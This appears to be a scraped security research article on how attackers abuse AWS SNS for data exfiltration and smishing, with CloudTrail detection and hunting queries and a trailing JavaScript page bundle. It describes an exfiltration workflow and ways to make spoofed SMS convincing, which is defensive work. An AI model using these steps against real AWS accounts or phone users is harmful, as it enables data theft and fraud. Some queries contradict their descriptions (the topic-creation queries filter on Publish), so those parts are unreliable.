delivery routes across different AWS regions to identify which countries permit custom Sender IDs or allow non-sandbox messages.\n\nIf an attacker’s test environment failed to receive SNS verification OTPs, they would likely pivot to a different AWS account or leverage a compromised AWS account that already had production-level messaging permissions.\n\nIn addition to this, the adversary would likely prioritize transactional messages over promotional. Transactional messages are prioritized by AWS (OTPs, security alerts, etc.) \\- whereas promotional messages are lower priority and may be filtered or blocked by certain carriers.\n\nIf adversaries cannot override message type defaults, their phishing messages may be deprioritized or rejected by AWS, which could be a hurdle.\n\n**Registered Origination Identity \u0026 Sender ID (If Supported)**\n\nAWS requires brand registration and origination identity verification for businesses sending high-volume SMS messages. Depending on the region and carrier, adversaries may be able to exploit different configurations:\n\n* **Sender ID Abuse**: In some non-U.S. regions, adversaries could register a Sender ID to make phishing messages appear from a trusted entity. This may allow for spoofing banks, shipping companies, or government agencies, making the phishing attempt more convincing.  \n* **Long Code \u0026 Toll-Free Exploitation**: AWS SNS assigns long codes (standard phone numbers) or toll-free numbers for outbound SMS. Toll-free numbers require registration but could still be abused if an adversary compromises an AWS account with an active toll-free messaging service.  \n* **Short Code Restrictions**: High-throughput short codes (5- or 6-digit numbers) are often carrier-controlled and require additional vetting, making them less practical for adversaries.\n\n### **Infrastructure Setup**\n\nBy default, AWS accounts that have not properly configured the [End User Messaging](https://docs.aws.amazon.com/sms-voice/latest/userguide/what-is-sms-mms.html) service are restricted to an [**SMS sandbox**](https://aws.amazon.com/blogs/compute/introducing-the-sms-sandbox-for-amazon-sns/). This sandbox allows developers to test SMS functionality by sending messages to verified phone numbers. However, as we discovered, the process of verifying numbers in the sandbox is fraught with challenges.\n\nDespite repeated attempts to register phone numbers with the sandbox, we found that verification messages (OTP codes) failed to arrive at endpoints across various carriers and services, including Google Voice and Twilio. This suggests that mobile carriers may block these sandbox-originated messages, effectively stalling the verification process but ultimately blocking us from emulating the behavior.\n\nFor production use, [migrating](https://docs.aws.amazon.com/sns/latest/dg/sns-sms-sandbox-moving-to-production.html) from the sandbox requires a fully configured AWS End User Messaging service. This includes:\n\n* A legitimate Sender ID.  \n* A phone pool for failovers.  \n* Origination identity.  \n* Brand registration for regulatory compliance.\n\nThis setup aligns with the requirements of the SNS Sender script and represents an ideal environment for adversaries. The use of a Sender ID, which relies on a pre-established [origination identity](https://docs.aws.amazon.com/sns/latest/dg/channels-sms-originating-identities.html) and brand registration, allows phishing messages to appear as though they originate from a reputable organization. This reduces the likelihood of detection or carrier-level blocking, increasing the success rate of the campaign.\n\nThe requirements for this attack suggests adversaries are likely to target companies that use AWS End User Messaging for automated SMS alerts and messaging. Industries such as logistics and delivery services, e-commerce platforms, and travel and hospitality are prime targets due to their reliance on automated SMS notifications.\n\nOn the recipient's side, the phishing message appears as if it originates from a trusted entity, bypassing carrier alarms and evading suspicion.\n\nDuring our testing, we encountered unexpected behavior with logging in CloudTrail when attempting to use the script and AWS CLI to send SMS messages directly through SNS. Failed message delivery attempts did not appear in CloudTrail logs as expected.\n\nAlthough the [**Publish**](https://docs.aws.amazon.com/sns/latest/api/API_Publish.html) API call is generally logged in CloudTrail (provided data plane events are enabled), it remains unclear if the absence of logs for failed attempts was due to inherent SNS behavior or misconfiguration on our part. This gap highlights the need for deeper investigation into how failed SNS Publish requests are handled by AWS and whether additional configurations are required to capture these events reliably.\n\nAs a result, we determined it would be best to include a threat hunting query for this rather than a detection rule due to the inability to fully replicate the adversary behavior, reliance on pre-established and registered brands and origination identity, in full. \n\n# Detection and Hunting Opportunities\n\nFor detection and hunting, CloudTrail audit logs provide enough visibility for the subsequent API calls from this activity. They also include enough contextual information to help aid with a higher fidelity of these anomalous signals. The following detections and hunting queries will leverage CloudTrail data ingested into our Elastic stack with the AWS CloudTrail integration, however they should be translatable to the SIEM of your choice if needed. For this activity, we focus solely on assumed roles, specifically those with EC2 instances being abused but this could take place elsewhere in AWS environments.\n\n## SNS Topic Created by Rare User\n\n[Detection Rule Source](https://github.com/elastic/detection-rules/blob/c5523c4d4060555e143b2d46fea1748173352b8f/rules/integrations/aws/resource_development_sns_topic_created_by_rare_user.toml)  \n[Hunting Query Source](https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_topic_created_by_rare_user.md)  \nMITRE ATT\\\u0026CK: [T1608](https://attack.mitre.org/techniques/T1608/)\n\nIdentifies when an SNS topic is created by a rare AWS user identity ARN (IAM User or Role). This detection leverages Elastic’s New Terms type rules to identify when the first occurrence of a user identity ARN creates an SNS topic. It would be awfully unusual for an assumed role, typically leveraged for EC2 instances to be creating SNS topics.\n\nOur query leverages KQL and [New Terms rule type](https://www.elastic.co/guide/en/security/current/rules-ui-create.html#create-new-terms-rule) to focus on topics created by an Assumed Role specifically for an EC2 instance.\n\n```\nevent.dataset: \"aws.cloudtrail\"\n    and event.provider: \"sns.amazonaws.com\"\n    and event.action: \"Publish\"\n    and aws.cloudtrail.user_identity.type: \"AssumedRole\"\n    and aws.cloudtrail.user_identity.arn: *i-*\n```\n\n### Hunting Query (ES|QL)  \n\nOur hunting query focuses on the CreateTopic API action from an entity whose identity type is an assumed role. We also parse the ARN to ensure that it is an EC2 instance this request is sourcing from. We can then aggregate on cloud account, entity (EC2 instance ID), assumed role name, region and user agent. If it is unusual for the EC2 instance reported to be creating SNS topics randomly, then it may be a good anomalous signal to investigate.\n\n```\nfrom logs-aws.cloudtrail-*\n| where @timestamp \u003e now() - 7 day\n| WHERE\n    event.dataset == \"aws.cloudtrail\" AND\n    event.provider == \"sns.amazonaws.com\" AND\n    event.action == \"Publish\"\n    and aws.cloudtrail.user_identity.type == \"AssumedRole\"\n| DISSECT aws.cloudtrail.request_parameters \"{%{?message_key}=%{message}, %{?topic_key}=%{topic_arn}}\"\n| DISSECT aws.cloudtrail.user_identity.arn \"%{?}:assumed-role/%{assumed_role_name}/%{entity}\"\n| DISSECT user_agent.original \"%{user_agent_name} %{?user_agent_remainder}\"\n| WHERE STARTS_WITH(entity, \"i-\")\n| STATS regional_topic_publish_count = COUNT(*) by cloud.account.id, entity, assumed_role_name, topic_arn, cloud.region, user_agent_name\n| SORT regional_topic_publish_count ASC\n```\n\nHunting Notes:\n\n* It is unusual already for credentials from an assumed role for an EC2 instance to be creating SNS topics randomly.  \n* If a user identity access key (aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.  \n* An attacker could pivot into Publish API actions being called to this specific topic to identify which AWS resource is publishing messages. With access to the topic, the attacker could then further investigate the subscribers list to identify unauthorized subscribers.\n\n## SNS Topic Subscription with Email by Rare User\n\n[Detection Rule Source](https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/exfiltration_sns_email_subscription_by_rare_user.toml)  \n[Hunting Query Source](https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_email_subscription_by_rare_user.md)  \nMITRE ATT\u0026CK: [T1567](https://attack.mitre.org/techniques/T1567/), [T1530](https://attack.mitre.org/techniques/T1530/)\n\nIdentifies when an SNS topic is subscribed to by a rare AWS user identity ARN (IAM User or Role). This detection leverages Elastic’s **New Terms** type rules to identify when the first occurrence of a user identity ARN attempts to subscribe to an existing SNS topic.The data exfiltration which took place during our whitebox testing example above would have been caught by this threat hunt; an alert would have been generated when we establish an SNS subscription to an external user.  \n\nFurther false-positive reductions could be obtained by whitelisting expected organization TLDs in the requested email address if the topic is meant for internal use only.\n\nOur query leverages KQL and New Terms rule type to focus on subscriptions that specify an email address. Unfortunately, CloudTrail redacts the email address subscribed or this would be vital for investigation.\n\n```\nevent.dataset: \"aws.cloudtrail\"\n    and event.provider: \"sns.amazonaws.com\"\n    and event.action: \"Subscribe\"\n    and aws.cloudtrail.request_parameters: *protocol=email*\n```\n\n**New Terms value**: aws.cloudtrail.user_identity.arn\n\n### Hunting Query (ES|QL)\n\nOur hunting query leverages ES|QL but parses the Subscribe API action parameters to filter further on the email protocol being specified. It also parses out the name of the user-agent, but relies further on aggregations to potentially identify other anomalous user-agent attributes. We've also included the region where the subscription occurred, as it may be uncommon for certain regions to be subscribed to others, depending on the specific business context of an organization.\n\n```\nfrom logs-aws.cloudtrail-*\n| where @timestamp \u003e now() - 7 day\n| WHERE\n    event.dataset == \"aws.cloudtrail\" AND\n    event.provider == \"sns.amazonaws.com\" AND\n    event.action == \"Subscribe\"\n| DISSECT aws.cloudtrail.request_parameters \"%{?protocol_key}=%{protocol}, %{?endpoint_key}=%{redacted}, %{?return_arn}=%{return_bool}, %{?topic_arn_key}=%{topic_arn}}\"\n| DISSECT user_agent.original \"%{user_agent_name} %{?user_agent_remainder}\"\n| WHERE protocol == \"email\"\n| STATS regional_topic_subscription_count = COUNT(*) by aws.cloudtrail.user_identity.arn, cloud.region, source.address, user_agent_name\n| WHERE regional_topic_subscription_count == 1\n| SORT regional_topic_subscription_count ASC\n```\n\nHunting Notes:\n\n* If a user identity access key (aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.  \n* Ignoring the topic ARN during aggregation is important to identify first occurrence anomalies of subscribing to SNS topic with an email. By not grouping subscriptions by topic ARN, we ensure that the query focuses on detecting unexpected or infrequent subscriptions only, regardless of specific topics already established.  \n* Another query may be required with the user identity ARN as an inclusion filter to identify which topic they subscribed to.  \n* If an anomalous user-agent name is observed, a secondary investigation into the user-agent string may be required to determine if it's associated with automated scripts, uncommon browsers, or mismatched platforms. While it is simple to fake these, adversaries have been known not to for undisclosed reasons.\n\n## SNS Topic Message Published by Rare User\n\n[Detection Rule Source](https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/lateral_movement_sns_topic_message_publish_by_rare_user.toml)  \n[Hunting Query Source](https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_topic_message_published_by_rare_user.md)\n\nIdentifies when a message is published to an SNS topic from an unusual user identity ARN in AWS. If the role or permission policy does not practice PoLP, publishing to SNS topics may be allowed and thus abused. For example, default roles supplied via AWS Marketplace that allow publishing to SNS topics. It may also identify rogue entities that once were pushing to SNS topics but no longer are being abused if credentials are compromised. Note that this focuses solely on EC2 instances, but you could adjust to account for different publish anomalies based on source, region, user agent and more.\n\nOur query leverages KQL and New Terms rule type to focus on subscriptions that specify an email address. Unfortunately, CloudTrail redacts the email address subscribed, as this would be a vital asset for investigation.\n\n```\nevent.dataset: \"aws.cloudtrail\"\n    and event.provider: \"sns.amazonaws.com\"\n    and event.action: \"Publish\"\n    and aws.cloudtrail.user_identity.type: \"AssumedRole\"\n    and aws.cloudtrail.user_identity.arn: *i-*\n```\n\n**New Terms value**: aws.cloudtrail.user_identity.arn\n\n### Hunting Query (ES|QL)\n\n Our hunting query leverages ES|QL and also focused on SNS logs where the API action is *Publish*. This only triggers if the user identity type is an assumed role and the user identity ARN is an EC2 instance ID. Aggregating on **account ID**, **entity**, **assumed role**, **SNS topic** and **region** help us identify any further anomalies based on expectancy of this activity. We can leverage the user agent to identify these calls being made by unusual tools or software as well.\n\n```\nfrom logs-aws.cloudtrail-*\n| where @timestamp \u003e now() - 7 day\n| WHERE\n    event.dataset == \"aws.cloudtrail\" AND\n    event.provider == \"sns.amazonaws.com\" AND\n    event.action == \"Publish\"\n    and aws.cloudtrail.user_identity.type == \"AssumedRole\"\n| DISSECT aws.cloudtrail.request_parameters \"{%{?message_key}=%{message}, %{?topic_key}=%{topic_arn}}\"\n| DISSECT aws.cloudtrail.user_identity.arn \"%{?}:assumed-role/%{assumed_role_name}/%{entity}\"\n| DISSECT user_agent.original \"%{user_agent_name} %{?user_agent_remainder}\"\n| WHERE STARTS_WITH(entity, \"i-\")\n| STATS regional_topic_publish_count = COUNT(*) by cloud.account.id, entity, assumed_role_name, topic_arn, cloud.region, user_agent_name\n| SORT regional_topic_publish_count ASC\n```\n\nHunting Notes:\n\n* If a user identity access key (aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.  \n* If you notice Terraform, Pulumi, etc. it may be related to testing environments, maintenance or more.  \n* Python SDKs that are not AWS, may indicate custom tooling or scripts being leveraged.\n\n## SNS Direct-to-Phone Messaging Spike\n\n[Hunting Query Source](https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_direct_to_phone_messaging_spike.md)  \nMITRE ATT\\\u0026CK: [T1660](https://attack.mitre.org/techniques/T1660/)\n\nOur hunting efforts for hypothesized SNS compromise—where an adversary is conducting phishing (smishing) campaigns—focus on *Publish* API actions in AWS SNS. Specifically, we track instances where *phoneNumber* is present in request parameters, signaling that messages are being sent directly to phone numbers rather than through an SNS topic.\n\nNotably, instead of relying on SNS topics with pre-subscribed numbers, the adversary exploits an organization’s production Endpoint Messaging permissions, leveraging:\n\n* An approved Origination ID (if the organization has registered one).  \n* A Sender ID (if the adversary controls one or can spoof a trusted identifier).  \n* AWS long codes or short codes (which may be dynamically assigned).\n\nSince AWS SNS sanitizes logs, phone numbers are not visible in CloudTrail, but deeper analysis in CloudWatch or third-party monitoring tools may help.\n\n### Hunting Query (ES|QL)\n\nThis query detects a spike in direct SNS messages, which may indicate smishing campaigns from compromised AWS accounts.\n\n```\nfrom logs-aws.cloudtrail-*\n| WHERE @timestamp \u003e now() - 7 day\n| EVAL target_time_window = DATE_TRUNC(10 seconds, @timestamp)\n| WHERE\n    event.dataset == \"aws.cloudtrail\" AND\n    event.provider == \"sns.amazonaws.com\" AND\n    event.action == \"Publish\" AND\n    event.outcome == \"success\" AND\n    aws.cloudtrail.request_parameters LIKE \"*phoneNumber*\"\n| DISSECT user_agent.original \"%{user_agent_name} %{?user_agent_remainder}\"\n| STATS sms_message_count = COUNT(*) by target_time_window, cloud.account.id, aws.cloudtrail.user_identity.arn, cloud.region, source.address, user_agent_name\n| WHERE sms_message_count \u003e 30\n```\n\nHunting Notes:\n\n* AWS removes phone numbers in logs, so deeper analysis via CloudWatch logs may be necessary.  \n* While investigating in CloudWatch, the message context is also sanitized. It would be ideal to investigate the message for any suspicious URL links being embedded in the text messages.  \n* You can also review AWS SNS delivery logs (if enabled) for message metadata.  \n* If messages are not using a topic-based subscription, it suggests direct targeting.  \n* The source of these requests is important, if you notice them from an EC2 instance, that is rather odd or Lambda may be an expected serverless code.\n\n# Takeaways\n\nThank you for taking the time to read this publication on **AWS SNS Abuse: Data Exfiltration and Phishing**. We hope this research provides valuable insights into how adversaries can leverage AWS SNS for data exfiltration, smishing and phishing campaigns, as well as practical detection and hunting strategies to counter these threats.\n\n**Key Takeaways:**\n\n* AWS SNS is a powerful service, but can be misused for malicious purposes, including phishing (smishing) and data exfiltration.  \n* Adversaries may abuse production SNS permissions using pre-approved Sender IDs, Origination IDs, or long/short codes to send messages outside an organization.  \n* Threat actors may weaponize misconfigurations in IAM policies, CloudTrail logging gaps and SNS API limitations to fly under the radar.  \n* While in-the-wild (ItW) abuse of SNS is not frequently reported, we are confident that its weaponization and targeted exploitation are already occurring or will emerge eventually.  \n* AWS CloudTrail does not capture phone numbers or messages in SNS logs, making CloudWatch third-party monitoring essential for deeper analysis  \n* Threat hunting queries can help detect SNS topics being created, subscribed to, or receiving a spike in direct messages, signaling potential abuse.  \n* Detection strategies include monitoring SNS API actions, identifying unusual SNS message spikes and flagging anomalies from EC2 or Lambda sources.  \n* Defensive measures should include IAM policy hardening, CloudTrail \u0026 SNS logging, anomaly-based detections and security best practices as recommended by AWS to reduce attack surface.\n\nAWS SNS is often overlooked in security discussions, but as this research shows, it presents a viable attack vector for adversaries if left unmonitored. We encourage defenders to stay proactive, refine detection logic, and implement robust security controls to mitigate these risks and increase security posture.\n\nThanks for reading and happy hunting\\!\n\n# References\n\n* [https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/](https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/)  \n* [https://permiso.io/blog/s/smishing-attack-on-aws-sms-new-phone-who-dis/](https://permiso.io/blog/s/smishing-attack-on-aws-sms-new-phone-who-dis/)  \n* [https://catalog.workshops.aws/build-sms-program/en-US](https://catalog.workshops.aws/build-sms-program/en-US)","code":"var Component=(()=\u003e{var h=Object.create;var a=Object.defineProperty;var u=Object.getOwnPropertyDescriptor;var g=Object.getOwnPropertyNames;var p=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var f=(n,e)=\u003e()=\u003e(e||n((e={exports:{}}).exports,e),e.exports),b=(n,e)=\u003e{for(var t in e)a(n,t,{get:e[t],enumerable:!0})},o=(n,e,t,r)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let s of g(e))!m.call(n,s)\u0026\u0026s!==t\u0026\u0026a(n,s,{get:()=\u003ee[s],enumerable:!(r=u(e,s))||r.enumerable});return n};var y=(n,e,t)=\u003e(t=n!=null?h(p(n)):{},o(e||!n||!n.__esModule?a(t,\"default\",{value:n,enumerable:!0}):t,n)),S=n=\u003eo(a({},\"__esModule\",{value:!0}),n);var c=f((N,l)=\u003e{l.exports=_jsx_runtime});var T={};b(T,{default:()=\u003eA,frontmatter:()=\u003ew});var i=y(c()),w={title:\"AWS SNS Abuse: Data Exfiltration and Phishing\",slug:\"aws-sns-abuse\",subtitle:\"Exploring how adversaries abuse AWS SNS services and detection capabilities\",date:\"2025-03-13\",description:\"During a recent internal collaboration, we  dug into publicly known SNS abuse attempts and our knowledge of the data source to develop detection capabilities.\",author:[{slug:\"terrance-dejesus\"}],image:\"Security Labs Images 7.jpg\",category:[{slug:\"security-research\"},{slug:\"security-operations\"}]};function d(n){let e=Object.assign({h1:\"h1\",p:\"p\",a:\"a\",img:\"img\",strong:\"strong\",h2:\"h2\",ul:\"ul\",li:\"li\",h3:\"h3\",code:\"code\",ol:\"ol\",em:\"em\",br:\"br\",pre:\"pre\"},n.components);return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h1,{id:\"preamble\",children:\"Preamble\"}),`\n`,(0,i.jsx)(e.p,{children:\"Welcome to another installment of AWS detection engineering with Elastic. This article will dive into both how threat adversaries (TA) leverage AWS\\u2019 Simple Notification Service (SNS) and how to hunt for indicators of abuse using that data source.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Expect to learn about potential techniques threat adversaries may exercise in regards to SNS. We will also explore security best practices, hardening roles and access, as well as how to craft threat detection logic for SNS abuse.\"}),`\n`,(0,i.jsx)(e.p,{children:\"This research was the result of a recent internal collaboration that required us to leverage SNS for data exfiltration during a whitebox exercise. During this collaboration, we became intrigued by how a simple publication and subscription (pub/sub) service could be abused by adversaries to achieve various actions on objectives. We dug into publicly known SNS abuse attempts and our knowledge of the data source to assemble this research about detection opportunities.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Do enjoy!\"}),`\n`,(0,i.jsx)(e.h1,{id:\"understanding-aws-sns\",children:\"Understanding AWS SNS\"}),`\n`,(0,i.jsx)(e.p,{children:\"Before we get started on the details, let\\u2019s discuss what AWS SNS is to have a basic foundational understanding.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"AWS SNS is a web service that allows users to send and receive notifications from the cloud. Think of it like a news feed service where a digital topic is created, those who are interested with updates subscribe via email, slack, etc. and when data is published to that topic, all subscribers are notified and receive it. This describes what is commonly referred to as a pub/sub service provided commonly by cloud service providers (CSP). In Azure, this is offered as \",(0,i.jsx)(e.a,{href:\"https://azure.microsoft.com/en-us/products/web-pubsub\",rel:\"nofollow\",children:\"Web PubSub\"}),\", whereas GCP offers \",(0,i.jsx)(e.a,{href:\"https://cloud.google.com/pubsub#documentation\",rel:\"nofollow\",children:\"Pub/Sub\"}),\". While the names of these services may slightly differ from platform to platform, the utility and purpose do not.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"SNS provides two workflows, \",(0,i.jsx)(e.a,{href:\"https://docs.aws.amazon.com/sns/latest/dg/sns-user-notifications.html\",rel:\"nofollow\",children:\"application-to-person\"}),\" (A2P) , and \",(0,i.jsx)(e.a,{href:\"https://docs.aws.amazon.com/sns/latest/dg/sns-system-to-system-messaging.html\",rel:\"nofollow\",children:\"application-to-application\"}),\" (A2A) that serve different purposes. A2P workflows focus more on integral operation with AWS services such as Firehose, Lambda, SQS and more. However, for this article we are going to focus our attention on A2P workflows. As shown in the diagram below, an SNS topic is commonly created, allowing subscribers to leverage SMS, email or push notifications for receiving messages.\"]}),`\n`,(0,i.jsx)(e.h1,{id:\"\",children:(0,i.jsx)(e.img,{src:\"/assets/images/aws-sns-abuse/image5.png\",alt:\"\",width:\"1232\",height:\"429\"})}),`\n`,(0,i.jsx)(e.h1,{id:\"-1\",children:(0,i.jsx)(e.img,{src:\"/assets/images/aws-sns-abuse/image12.png\",alt:\"\",width:\"1046\",height:\"535\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:\"Additional Features:\"})}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Filter Policies:\"}),\" Subscribers can  define filtering rules to receive only a relevant subset of messages if they choose. These filter policies are defined in JSON format; specifying which attributes of a message the subscriber is interested in. SNS evaluates these policies server-side before delivery to determine which subscribers the messages should be sent to.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Encryption\"}),\": SNS leverages \",(0,i.jsx)(e.a,{href:\"https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html\",rel:\"nofollow\",children:\"server-side encryption\"}),\" (SSE) using AWS Key Management Service (KMS) to secure messages at rest. When encryption is enabled, messages are encrypted before being stored in SNS and then decrypted upon delivery to the endpoint. This is of course important for maintaining the security of Personal Identifiable Information (PII) or other sensitive data such as account numbers. Not to fear, although SNS only encrypts at rest, other protocols (such as HTTPS) handle encryption in transit, making it end-to-end (E2E).\"]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Delivery Retries and Dead Letter Queues (DLQs)\"}),\": SNS automatically retries message delivery to endpoints, such as SQS, Lambda, etc. in case of unexpected failures. However, messages that fail to deliver ultimately reside in \",(0,i.jsx)(e.a,{href:\"https://docs.aws.amazon.com/sns/latest/dg/sns-dead-letter-queues.html\",rel:\"nofollow\",children:\"DLQs\"}),\", which is typically an AWS SQS queue enabling debugging for developers.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Scalability\"}),\": AWS SNS is designed to handle massive message volumes, automatically scaling to accommodate increasing traffic without manual intervention. There are no upfront provisioning requirements, and you pay only for what you use, making it cost-effective for most organizations.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"AWS SNS is a powerful tool for facilitating communication in cloud environments. For a deeper understanding, we recommend diving into the existing \",(0,i.jsx)(e.a,{href:\"https://docs.aws.amazon.com/sns/latest/dg/welcome.html\",rel:\"nofollow\",children:\"documentation\"}),\" from AWS. However, its versatility and integration capabilities also make it susceptible to abuse. In the next section, we explore some scenarios where adversaries might leverage SNS for malicious purposes.\"]}),`\n`,(0,i.jsx)(e.h1,{id:\"whitebox-testing\",children:\"Whitebox Testing\"}),`\n`,(0,i.jsx)(e.p,{children:'Whitebox testing involves performing atomic emulations of malicious behavior in a controlled environment, with full visibility into the vulnerable or misconfigured infrastructure and its configurations. This approach is commonly employed in cloud environments to validate detection capabilities during the development of threat detection rules or models targeting specific tactics, techniques, and procedures (TTPs).. Unlike endpoint environments, where adversary simulations often involve detonating malware binaries and tools, cloud-based TTPs typically exploit existing API-driven services through \"living-off-the-cloud\" techniques, making this approach essential for accurate analysis and detection.'}),`\n`,(0,i.jsx)(e.h2,{id:\"data-exfiltration-via-sns\",children:\"Data Exfiltration via SNS\"}),`\n`,(0,i.jsx)(e.p,{children:\"Exfiltration via SNS starts with creating a topic that serves as a proxy for receiving stolen data and delivering it to the external media source, such as email or mobile. Adversaries would then subscribe that media source to the topic so that any data received is forwarded to them. After this is staged, it is only a matter of packaging data and publishing it to the SNS topic, which handles the distribution. This method allows adversaries to bypass traditional data protection mechanisms such as network ACLs, and exfiltrate information to unauthorized external destinations.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:\"Example Workflow:\"})}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Land on EC2 instance and perform discovery of sensitive data, stage it for later\"}),`\n`,(0,i.jsx)(e.li,{children:\"Leverage IMDSv2 and STS natively with the installed AWS CLI to get temporary creds\"}),`\n`,(0,i.jsx)(e.li,{children:\"Create a topic in SNS and attach an external email address as a subscriber\"}),`\n`,(0,i.jsx)(e.li,{children:\"Publish sensitive information to the topic, encoded in Base64 (or plaintext)\"}),`\n`,(0,i.jsx)(e.li,{children:\"The external email address receives the exfiltrated data\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/aws-sns-abuse/image3.png\",alt:\"Visual workflow for data exfiltration via AWS SNS\",width:\"1999\",height:\"1468\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"infrastructure-setup\",children:\"Infrastructure Setup\"}),`\n`,(0,i.jsx)(e.p,{children:\"For the victim infrastructure, we\\u2019ll use our preferred infrastructure-as-code (IaC) framework, Terraform.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"A \",(0,i.jsx)(e.a,{href:\"https://gist.github.com/terrancedejesus/a01aa8f75f715e6baa726a21fcdf2289\",rel:\"nofollow\",children:\"public gist\"}),\" has been created, containing all the necessary files to follow this example.. In summary, these Terraform configurations deploy an EC2 instance in AWS within a public subnet. The setup includes a \",(0,i.jsx)(e.a,{href:\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html\",rel:\"nofollow\",children:\"user-data script\"}),\" that adds dummy credentials for sensitive data as environment variables, and installs the AWS CLI to emulate a compromised environment. Additionally, the EC2 instance is assigned an IAM role with permissions for \",(0,i.jsx)(e.code,{children:\"sns:Publish\"}),\", \",(0,i.jsx)(e.code,{children:\"sns:Subscribe\"}),\" and \",(0,i.jsx)(e.code,{children:\"sns:CreateTopic\"}),\".\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"There are several potential ways an adversary might gain initial access to this EC2 instance, including exploiting vulnerable web applications for web shell deployment, using stolen SSH credentials, password spraying or credential stuffing. Within this particular example scenario; let\\u2019s assume the attacker gained initial entry via a vulnerable web application, and subsequently uploaded a web shell. The next goal in this case would be persistence via credential access.. This is commonly seen \",(0,i.jsx)(e.a,{href:\"https://www.wiz.io/blog/wiz-research-identifies-exploitation-in-the-wild-of-aviatrix-cve-2024-50603\",rel:\"nofollow\",children:\"in-the-wild\"}),\" when adversaries target popular 3rd-party software or web apps such as Oracle WebLogic, Apache Tomcat, Atlassian Confluence, Microsoft Exchange and much more.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"To get started, download the Terraform files from the gist.\"}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Adjust the variables in the \",(0,i.jsx)(e.code,{children:\"variables.tf\"}),\" file to match your setup.\",`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Add your whitelisted IPv4 addressfor trusted_ip_cidr\"}),`\n`,(0,i.jsx)(e.li,{children:\"Add your local SSH key file path to public_key_path\"}),`\n`,(0,i.jsx)(e.li,{children:\"Ensure the ami_id.default is the correct AMI-ID for your region\"}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Run \",(0,i.jsx)(e.code,{children:\"terraform init\"}),\" in the folder to initialize the working directory.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"When ready, run \",(0,i.jsx)(e.code,{children:\"terraform apply\"}),\" to deploy the infrastructure.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"A few reminders:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Terraform uses your AWS CLI default profile, so ensure you\\u2019re working with the correct profile in your AWS configuration.\"}),`\n`,(0,i.jsxs)(e.li,{children:[\"The provided AMI ID is specific to the \",(0,i.jsx)(e.code,{children:\"us-east-1\"}),\" region. If you're deploying in a different region, update the AMI ID accordingly in the \",(0,i.jsx)(e.code,{children:\"variables.tf\"}),\" file.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Change \",(0,i.jsx)(e.code,{children:\"trusted_ip_cidr.default\"}),\" in \",(0,i.jsx)(e.code,{children:\"variables.tf\"}),\" from 0.0.0.0/0 (any IP) to your publicly known CIDR range.\"]}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/aws-sns-abuse/image2.png\",alt:\"\",width:\"1742\",height:\"814\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Terraform apply output\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Let\\u2019s SSH into our EC2 instance to ensure that our sensitive credentials were created from the user-data script. Note in the \",(0,i.jsx)(e.code,{children:\"outputs.tf\"}),\" file, we ensured that the SSH command would be generated for us based on the key path and public IP of our EC2 instance.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/aws-sns-abuse/image10.png\",alt:\"Bash command output for credential check\",width:\"1758\",height:\"486\"})}),`\n`,(0,i.jsx)(e.p,{children:\"With this infrastructure staged and confirmed, we can then move on to practical 